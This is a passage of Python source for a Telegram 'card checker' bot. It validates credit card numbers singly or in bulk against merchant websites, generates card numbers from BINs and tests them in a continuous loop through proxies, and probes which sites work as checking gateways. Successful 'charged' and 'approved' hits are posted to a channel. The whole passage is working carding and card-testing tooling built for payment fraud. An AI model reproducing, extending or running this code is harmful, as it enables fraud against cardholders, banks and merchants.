        kb.append([InlineKeyboardButton("🔙 𝐁𝐚𝐜𝐤", callback_data="btn_autochk")])
        await update.message.reply_text(
            f"🔎 Found <b>{len(results)}</b> BINs for '<code>{text.strip()}</code>':\n"
            "Select one:",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(kb),
        )

    elif awaiting == 'autochk_bin':
        context.user_data['awaiting'] = None
        bin_str = text.strip().split()[0]
        if len(bin_str) < 6:
            await update.message.reply_text(
                "BIN must be at least 6 digits.",
                reply_markup=main_menu_keyboard(),
            )
            return
        context.user_data['autochk_bin'] = bin_str
        await update.message.reply_text(
            f"⚡ BIN set: <code>{bin_str}</code>\n\nNow send the site URL:",
            parse_mode="HTML",
            reply_markup=back_button(),
        )
        context.user_data['awaiting'] = 'autochk_site'

    elif awaiting == 'autochk_site':
        context.user_data['awaiting'] = None
        site = text.strip().split()[0]
        context.user_data['autochk_site'] = site
        await update.message.reply_text(
            f"⚡ Site set: <code>{site}</code>\n\nUse proxy?",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🌐 𝐀𝐝𝐝 𝐏𝐫𝐨𝐱𝐲", callback_data="aproxy_yes"),
                 InlineKeyboardButton("⏭️ 𝐒𝐤𝐢𝐩", callback_data="aproxy_no")],
                [InlineKeyboardButton("🔙 𝐁𝐚𝐜𝐤 𝐭𝐨 𝐌𝐞𝐧𝐮", callback_data="btn_back")],
            ]),
        )

    elif awaiting == 'autochk_proxy':
        context.user_data['awaiting'] = None
        context.user_data['autochk_proxy'] = text.strip()
        user_id = update.effective_user.id
        msg = await update.message.reply_text("⚡ Starting Auto Check with proxy... ⏳", parse_mode="HTML")
        asyncio.create_task(
            run_continuous_autochk(update, context, user_id, msg)
        )

    else:
        if '|' in text and ' ' in text:
            await handle_single_check(update, context, text)
        elif text.replace('.', '').replace('/', '').replace(':', '').replace('-', '').isalnum() and '.' in text:
            await handle_site_check(update, context, text)
        else:
            await update.message.reply_text(
                "Use /start for button menu 👇\n"
                "Or type a command directly.",
                reply_markup=main_menu_keyboard(),
            )


# ─── File handler ──────────────────────────────────────────


async def file_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update):
        await deny(update)
        return

    doc = update.message.document
    if not doc:
        return

    file = await doc.get_file()
    data = await file.download_as_bytearray()
    lines = [l.strip() for l in data.decode('utf-8', errors='ignore').splitlines() if l.strip()]

    if not lines:
        await update.message.reply_text("File is empty.", reply_markup=main_menu_keyboard())
        return

    awaiting = context.user_data.get('awaiting')

    if awaiting == 'mass_cards':
        context.user_data['awaiting'] = None
        cards = [l for l in lines if '|' in l]
        if not cards:
            await update.message.reply_text("No valid cards in file.", reply_markup=main_menu_keyboard())
            return
        site = context.user_data.get('mass_site', '')
        await handle_mass_check(update, context, cards, site)

    elif awaiting == 'msite':
        context.user_data['awaiting'] = None
        await handle_mass_site(update, context, lines)

    elif '|' in lines[0]:
        await update.message.reply_text(
            f"Detected {len(lines)} cards.\n"
            "Use /mass <code>site_url</code> and reply to this file.\n"
            "Or press 📋 Mass Check button.",
            parse_mode="HTML", reply_markup=main_menu_keyboard(),
        )
    else:
        await update.message.reply_text(
            f"Detected {len(lines)} sites.\n"
            "Use /msite and reply to this file.\n"
            "Or press 📡 Mass Site button.",
            parse_mode="HTML", reply_markup=main_menu_keyboard(),
        )


# ─── Feature handlers ──────────────────────────────────────


async def handle_single_check(update: Update, context: ContextTypes.DEFAULT_TYPE, text: str):
    parts_raw = text.split()
    if len(parts_raw) < 2:
        await update.message.reply_text(
            "Send: <code>cc|mm|yy|cvv site_url</code>",
            parse_mode="HTML", reply_markup=main_menu_keyboard(),
        )
        return

    cc_string = parts_raw[0]
    site = parts_raw[1]
    if not site.startswith('http'):
        site = 'https://' + site

    msg = await update.message.reply_text("𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠... ⏳")

    try:
        parts = parse_cc_string(cc_string)
    except ValueError as e:
        await msg.edit_text(f"Invalid format: {e}", reply_markup=main_menu_keyboard())
        return

    success, message, gateway, price, currency, category = await run_with_retry(parts, site)
    appr_clean = approved_message(message) if category == 'approved' else None
    clean = appr_clean if appr_clean else extract_clean_response(message)
    if category == 'charged':
        clean = 'ORDER_PLACED'
    elif category == 'tds':
        clean = 'OTP_REQUIRED'

    bin_info = await get_bin_info(parts['cc'])
    price_fmt = fmt_price(price, currency)
    info_str = fmt_info(bin_info['brand'], bin_info['type'], bin_info['level'])

    result_text = build_result_text(
        cc_string, category, clean, price_fmt, info_str,
        bin_info['bank'], bin_info['country'], bin_info['flag']
    )
    await msg.edit_text(result_text, parse_mode="HTML", reply_markup=main_menu_keyboard())

    if category in ('charged', 'approved', 'tds'):
        try:
            await context.bot.send_message(chat_id=CHANNEL_ID, text=result_text, parse_mode="HTML")
        except Exception as e:
            logger.error(f"Channel post error: {e}")


async def handle_mass_check(update: Update, context: ContextTypes.DEFAULT_TYPE, cards: list, site: str):
    msg = await update.message.reply_text(f"𝐌𝐚𝐬𝐬 𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠 {len(cards)} cards... ⏳")

    stats = {'charged': 0, 'approved': 0, 'tds': 0, 'declined': 0, 'error': 0}

    for i, cc_string in enumerate(cards):
        try:
            parts = parse_cc_string(cc_string)
        except Exception:
            stats['error'] += 1
            continue

        success, message, gateway, price, currency, category = await run_with_retry(parts, site)
        stats[category] += 1

        if category in ('charged', 'approved', 'tds'):
            appr_clean = approved_message(message) if category == 'approved' else None
            clean = appr_clean if appr_clean else extract_clean_response(message)
            if category == 'charged':
                clean = 'ORDER_PLACED'
            elif category == 'tds':
                clean = 'OTP_REQUIRED'

            bin_info = await get_bin_info(parts['cc'])
            price_fmt = fmt_price(price, currency)
            info_str = fmt_info(bin_info['brand'], bin_info['type'], bin_info['level'])
            result_text = build_result_text(
                cc_string, category, clean, price_fmt, info_str,
                bin_info['bank'], bin_info['country'], bin_info['flag']
            )
            try:
                await context.bot.send_message(chat_id=CHANNEL_ID, text=result_text, parse_mode="HTML")
            except Exception as e:
                logger.error(f"Channel post error: {e}")

        if (i + 1) % 10 == 0:
            try:
                await msg.edit_text(f"𝐏𝐫𝐨𝐠𝐫𝐞𝐬𝐬: {i + 1}/{len(cards)} checked ⏳")
            except Exception:
                pass

    summary = (
        f"<b>𝐂𝐀𝐑𝐃 𝐒𝐄𝐒𝐒𝐈𝐎𝐍 𝐑𝐄𝐒𝐔𝐋𝐓𝐒</b>\n"
        f"━━━━━━━━━━━━━━\n"
        f"𝐓𝐨𝐭𝐚𝐥 𝐂𝐚𝐫𝐝𝐬: {len(cards)}\n\n"
        f"𝐂𝐡𝐚𝐫𝐠𝐞𝐝: {stats['charged']} 🔥\n"
        f"𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝: {stats['approved']} ✅\n"
        f"𝟑𝐃𝐒: {stats['tds']} ❎\n"
        f"𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝: {stats['declined']} ❌\n"
        f"𝐄𝐫𝐫𝐨𝐫𝐬: {stats['error']} ⚠️\n"
        f"━━━━━━━━━━━━━━\n"
        f"𝐃𝐞𝐯 ➜ @Xoarch"
    )
    await msg.edit_text(summary, parse_mode="HTML", reply_markup=main_menu_keyboard())

    try:
        await context.bot.send_message(chat_id=CHANNEL_ID, text=summary, parse_mode="HTML")
    except Exception as e:
        logger.error(f"Channel summary error: {e}")


async def handle_site_check(update: Update, context: ContextTypes.DEFAULT_TYPE, text: str):
    site = text if text.startswith('http') else f'https://{text}'
    msg = await update.message.reply_text("𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠 𝐬𝐢𝐭𝐞... ⏳")

    test_cc = TEST_CARDS[0]
    parts = parse_cc_string(test_cc)

    try:
        success, message, gateway, price, currency, category = await run_with_retry(parts, site)
        msg_lower = message.lower()
        if any(kw in msg_lower for kw in WORKING_KEYWORDS) or category != 'error':
            await msg.edit_text(
                f"✅ <b>WORKING</b> ➜ <code>{site}</code>",
                parse_mode="HTML", reply_markup=main_menu_keyboard(),
            )
        else:
            await msg.edit_text(
                f"❌ <b>DEAD</b> ➜ <code>{site}</code>",
                parse_mode="HTML", reply_markup=main_menu_keyboard(),
            )
    except Exception:
        await msg.edit_text(
            f"❌ <b>DEAD</b> ➜ <code>{site}</code>",
            parse_mode="HTML", reply_markup=main_menu_keyboard(),
        )


async def handle_mass_site(update: Update, context: ContextTypes.DEFAULT_TYPE, sites: list):
    msg = await update.message.reply_text(f"𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠 {len(sites)} sites... ⏳")

    working, dead = [], []
    for i, site in enumerate(sites):
        if not site.startswith('http'):
            site = 'https://' + site
        test_cc = TEST_CARDS[i % len(TEST_CARDS)]
        parts = parse_cc_string(test_cc)
        try:
            success, message, gateway, price, currency, category = await run_with_retry(parts, site)
            msg_lower = message.lower()
            if any(kw in msg_lower for kw in WORKING_KEYWORDS) or category != 'error':
                working.append(site)
            else:
                dead.append(site)
        except Exception:
            dead.append(site)

        if (i + 1) % 5 == 0:
            try:
                await msg.edit_text(f"𝐏𝐫𝐨𝐠𝐫𝐞𝐬𝐬: {i + 1}/{len(sites)} ⏳")
            except Exception:
                pass

    summary = (
        f"<b>𝐒𝐈𝐓𝐄 𝐒𝐄𝐒𝐒𝐈𝐎𝐍 𝐑𝐄𝐒𝐔𝐋𝐓𝐒</b>\n"
        f"━━━━━━━━━━━━━━\n"
        f"𝐓𝐨𝐭𝐚𝐥: {len(sites)}\n\n"
        f"𝐖𝐨𝐫𝐤𝐢𝐧𝐠: {len(working)} ✅\n"
        f"𝐃𝐞𝐚𝐝: {len(dead)} ❌\n"
        f"━━━━━━━━━━━━━━\n"
        f"𝐃𝐞𝐯 ➜ @Xoarch"
    )
    await msg.edit_text(summary, parse_mode="HTML", reply_markup=main_menu_keyboard())

    if working:
        working_text = "\n".join([f"✅ {s}" for s in working])
        await update.message.reply_text(
            f"<b>𝐖𝐨𝐫𝐤𝐢𝐧𝐠 𝐒𝐢𝐭𝐞𝐬:</b>\n{working_text}",
            parse_mode="HTML",
        )


async def handle_gen(update: Update, context: ContextTypes.DEFAULT_TYPE, bin_str: str, count: int = 10):
    cards = generate_cards_from_bin(bin_str, count)
    if not cards:
        await update.message.reply_text(
            "Invalid BIN. Send at least 6 digits.",
            reply_markup=main_menu_keyboard(),
        )
        return

    bin6 = ''.join(c for c in bin_str if c.isdigit())[:6]
    info = await get_bin_info(bin6)
    info_str = fmt_info(info['brand'], info['type'], info['level'])

    cards_text = "\n".join([f"<code>{c}</code>" for c in cards])
    result = (
        f"<b>🎲 𝐁𝐈𝐍 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐨𝐫</b>\n"
        f"━━━━━━━━━━━━━\n"
        f"𝐁𝐈𝐍: <code>{bin_str}</code>\n"
        f"𝙄𝙣𝙛𝙤: {info_str}\n"
        f"𝘽𝙖𝙣𝙠: {info['bank']}\n"
        f"𝘾𝙤𝙪𝗻𝘁𝗿𝐲: {info['country']} {info['flag']}\n"
        f"𝐂𝐨𝐮𝐧𝐭: {len(cards)}\n"
        f"━━━━━━━━━━━━━\n"
        f"{cards_text}\n"
        f"━━━━━━━━━━━━━\n"
        f"𝐃𝐞𝐯 ➜ @Xoarch"
    )
    await update.message.reply_text(result, parse_mode="HTML", reply_markup=main_menu_keyboard())


async def run_continuous_autochk(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id: int, status_msg):
    bin_str = context.user_data.get('autochk_bin', '')
    site = context.user_data.get('autochk_site', '')
    proxy_str = context.user_data.get('autochk_proxy', None)

    if not site.startswith('http'):
        site = 'https://' + site

    bin6 = ''.join(c for c in bin_str if c.isdigit())[:6]
    if len(bin6) < 6:
        try:
            await status_msg.edit_text(
                "Invalid BIN. Send at least 6 digits.",
                reply_markup=main_menu_keyboard(),
            )
        except Exception:
            pass
        return

    info = await get_bin_info(bin6)
    info_str = fmt_info(info['brand'], info['type'], info['level'])

    session = {
        'running': True,
        'stats': {'charged': 0, 'approved': 0, 'tds': 0, 'declined': 0, 'error': 0},
        'total': 0,
        'start_time': time.time(),
    }
    active_sessions[user_id] = session

    proxy_label = f"Proxy: {proxy_str}" if proxy_str else "No Proxy"
    last_status_update = time.time()

    try:
        await status_msg.edit_text(
            f"⚡ <b>𝐀𝐔𝐓𝐎 𝐂𝐇𝐄𝐂𝐊 𝐑𝐔𝐍𝐍𝐈𝐍𝐆</b>\n"
            f"━━━━━━━━━━━━━━\n"
            f"𝐁𝐈𝐍: <code>{bin_str}</code>\n"
            f"𝙄𝙣𝙛𝙤: {info_str}\n"
            f"𝐒𝐢𝐭𝐞: <code>{site}</code>\n"
            f"🌐 {proxy_label}\n"
            f"━━━━━━━━━━━━━━\n"
            f"Scanning... Use 🛑 Stop or /stop to halt.\n"
            f"Live updates every 5 seconds.",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🛑 𝐒𝐓𝐎𝐏", callback_data="btn_stop")]
            ]),
        )
    except Exception:
        pass

    while session['running']:
        cards = generate_cards_from_bin(bin_str, 10)
        if not cards:
            break

        for cc_string in cards:
            if not session['running']:
                break

            try:
                parts = parse_cc_string(cc_string)
            except Exception:
                session['stats']['error'] += 1
                session['total'] += 1
                continue

            success, message, gateway, price, currency, category = await run_with_retry(
                parts, site, proxy_str
            )
            session['stats'][category] += 1
            session['total'] += 1

            if category in ('charged', 'approved', 'tds'):
                appr_clean = approved_message(message) if category == 'approved' else None
                clean = appr_clean if appr_clean else extract_clean_response(message)
                if category == 'charged':
                    clean = 'ORDER_PLACED'
                elif category == 'tds':
                    clean = 'OTP_REQUIRED'

                price_fmt = fmt_price(price, currency)
                result_text = build_result_text(
                    cc_string, category, clean, price_fmt, info_str,
                    info['bank'], info['country'], info['flag']
                )
                try:
                    await context.bot.send_message(
                        chat_id=CHANNEL_ID, text=result_text, parse_mode="HTML"
                    )
                except Exception as e:
                    logger.error(f"Channel post error: {e}")
                try:
                    chat_id = update.effective_chat.id
                    await context.bot.send_message(
                        chat_id=chat_id, text=result_text, parse_mode="HTML"
                    )
                except Exception:
                    pass

            now = time.time()
            if now - last_status_update >= 5:
                last_status_update = now
                elapsed = int(now - session['start_time'])
                mins, secs = divmod(elapsed, 60)
                stats = session['stats']
                try:
                    await status_msg.edit_text(
                        f"⚡ <b>𝐀𝐔𝐓𝐎 𝐂𝐇𝐄𝐂𝐊 𝐑𝐔𝐍𝐍𝐈𝐍𝐆</b>\n"
                        f"━━━━━━━━━━━━━━\n"
                        f"𝐁𝐈𝐍: <code>{bin_str}</code> | {info_str}\n"
                        f"𝐒𝐢𝐭𝐞: <code>{site}</code>\n"
                        f"🌐 {proxy_label}\n"
                        f"━━━━━━━━━━━━━━\n"
                        f"𝐒𝐜𝐚𝐧𝐧𝐞𝐝: {session['total']} | ⏱ {mins}m {secs}s\n\n"
                        f"🔥 Charged: {stats['charged']}\n"
                        f"✅ Approved: {stats['approved']}\n"
                        f"❎ 3DS: {stats['tds']}\n"
                        f"❌ Declined: {stats['declined']}\n"
                        f"⚠️ Errors: {stats['error']}\n"
                        f"━━━━━━━━━━━━━━\n"
                        f"Press 🛑 STOP or /stop to halt",
                        parse_mode="HTML",
                        reply_markup=InlineKeyboardMarkup([
                            [InlineKeyboardButton("🛑 𝐒𝐓𝐎𝐏", callback_data="btn_stop")]
                        ]),
                    )
                except Exception:
                    pass

    # Session ended
    if user_id in active_sessions:
        del active_sessions[user_id]

    elapsed = int(time.time() - session['start_time'])
    mins, secs = divmod(elapsed, 60)
    stats = session['stats']
    summary = (
        f"<b>⚡ 𝐀𝐔𝐓𝐎 𝐂𝐇𝐄𝐂𝐊 𝐒𝐓𝐎𝐏𝐏𝐄𝐃</b>\n"
        f"━━━━━━━━━━━━━━\n"
        f"𝐁𝐈𝐍: <code>{bin_str}</code>\n"
        f"𝙄𝙣𝙛𝙤: {info_str}\n"
        f"𝘽𝙖𝙣𝙠: {info['bank']}\n"
        f"𝐒𝐢𝐭𝐞: <code>{site}</code>\n"
        f"⏱ Duration: {mins}m {secs}s\n"
        f"━━━━━━━━━━━━━━\n"
        f"𝐓𝐨𝐭𝐚𝐥 𝐒𝐜𝐚𝐧𝐧𝐞𝐝: {session['total']}\n\n"
        f"𝐂𝐡𝐚𝐫𝐠𝐞𝐝: {stats['charged']} 🔥\n"
        f"𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝: {stats['approved']} ✅\n"
        f"𝟑𝐃𝐒: {stats['tds']} ❎\n"
        f"𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝: {stats['declined']} ❌\n"
        f"𝐄𝐫𝐫𝐨𝐫𝐬: {stats['error']} ⚠️\n"
        f"━━━━━━━━━━━━━━\n"
        f"𝐃𝐞𝐯 ➜ @Xoarch"
    )
    try:
        await status_msg.edit_text(summary, parse_mode="HTML", reply_markup=main_menu_keyboard())
    except Exception:
        pass

    try:
        await context.bot.send_message(chat_id=CHANNEL_ID, text=summary, parse_mode="HTML")
    except Exception as e:
        logger.error(f"Channel summary error: {e}")


async def handle_bin_lookup(update: Update, context: ContextTypes.DEFAULT_TYPE, text: str):
    bin6 = text.strip()[:6]
    if not bin6.isdigit() or len(bin6) < 6:
        await update.message.reply_text(
            "Send a valid 6-digit BIN number.",
            reply_markup=main_menu_keyboard(),
        )
        return

    info = await get_bin_info(bin6)
    result = (
        f"<b>🏦 𝐁𝐈𝐍 𝐋𝐨𝐨𝐤𝐮𝐩 ➜ {bin6}</b>\n"
        f"━━━━━━━━━━━━━\n"
        f"𝐁𝐫𝐚𝐧𝐝: {info['brand']}\n"
        f"𝐓𝐲𝐩𝐞: {info['type']}\n"
        f"𝐋𝐞𝐯𝐞𝐥: {info['level']}\n"
        f"𝐁𝐚𝐧𝐤: {info['bank']}\n"
        f"𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {info['country']} {info['flag']}\n"
        f"━━━━━━━━━━━━━\n"
        f"𝐃𝐞𝐯 ➜ @Xoarch"
    )
    await update.message.reply_text(result, parse_mode="HTML", reply_markup=main_menu_keyboard())


# ─── Main ──────────────────────────────────────────────────


def build_app():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start_cmd))
    app.add_handler(CommandHandler("help", help_cmd))
    app.add_handler(CommandHandler("chk", chk_cmd))
    app.add_handler(CommandHandler("mass", mass_cmd))
    app.add_handler(CommandHandler("site", site_cmd))
    app.add_handler(CommandHandler("msite", msite_cmd))
    app.add_handler(CommandHandler("bin", bin_cmd))
    app.add_handler(CommandHandler("gen", gen_cmd))
    app.add_handler(CommandHandler("autochk", autochk_cmd))
    app.add_handler(CommandHandler("stop", stop_cmd))
    app.add_handler(CallbackQueryHandler(button_router))
    app.add_handler(MessageHandler(filters.Document.ALL, file_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))
    return app


def main():
    app = build_app()
    logger.info("Bot started polling...")
    app.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()
